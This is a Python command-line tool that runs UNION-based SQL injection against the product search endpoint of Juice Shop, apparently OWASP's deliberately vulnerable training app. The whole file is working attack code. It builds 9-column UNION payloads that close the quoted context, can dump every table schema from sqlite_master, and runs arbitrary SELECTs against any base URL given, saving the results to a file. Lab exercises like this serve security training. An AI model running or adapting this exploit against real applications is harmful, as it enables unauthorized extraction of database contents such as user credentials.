#!/usr/bin/env python3
"""UNION SQL injection executor against /rest/products/search.

The Juice Shop product search builds raw SQL and the search term lands inside
a quoted context. The result set has 9 columns, so a UNION with a 9-column
target returns arbitrary rows from the SQLite database.

Usage:
  union_sqli.py --base BASE [--cookie COOKIE] schema
  union_sqli.py --base BASE [--cookie COOKIE] query --select COLS --from TBL [--where COND]
"""

import argparse
import json
import sys

import requests


def build_payload(select_cols, from_clause, where_clause=""):
    """Pad the user columns to 9 with integer literals and wrap the UNION."""
    cols = [c.strip() for c in select_cols.split(",") if c.strip()]
    while len(cols) < 9:
        cols.append(str(len(cols) + 1))
    select = ", ".join(cols)
    sql = f"SELECT {select} FROM {from_clause}"
    if where_clause:
        sql += f" WHERE {where_clause}"
    return f"x')) UNION {sql}--"


def run(base, cookie, q, out=None):
    headers = {}
    if cookie:
        headers["Cookie"] = cookie
    r = requests.get(f"{base}/rest/products/search", params={"q": q}, headers=headers, timeout=30)
    print(f"[*] HTTP {r.status_code}")
    try:
        data = r.json()
    except Exception:
        print(r.text[:2000])
        return
    rows = data.get("data", data)
    text = []
    if isinstance(rows, list):
        for row in rows:
            if isinstance(row, dict):
                vals = [v for v in row.values() if isinstance(v, (str, int, float))]
                text.append(" | ".join(str(v) for v in vals))
    else:
        text.append(str(rows))
    body = "\n".join(text)
    if out:
        with open(out, "w") as f:
            f.write(body + "\n")
        print(f"[*] wrote {len(body)} bytes to {out}")
    else:
        print(body)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="app origin, e.g. https://host")
    ap.add_argument("--cookie", default="", help="proxy/session cookie header value")
    ap.add_argument("--out", default="", help="write results to a file instead of stdout")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("schema", help="dump CREATE TABLE statements from sqlite_master")
    p1.add_argument("--table", default="%", help="LIKE filter on table name (default: all)")

    p2 = sub.add_parser("query", help="run an arbitrary UNION SELECT")
    p2.add_argument("--select", required=True, help="columns to select (padded to 9)")
    p2.add_argument("--from", dest="from_clause", required=True, help="table/view name")
    p2.add_argument("--where", default="", help="optional WHERE clause")

    args = ap.parse_args()

    if args.cmd == "schema":
        q = build_payload("sql", "sqlite_master", f"type='table' AND name LIKE '{args.table}'")
    else:
        q = build_payload(args.select, args.from_clause, args.where)
    run(args.base, args.cookie, q, args.out)


if __name__ == "__main__":
    sys.exit(main())
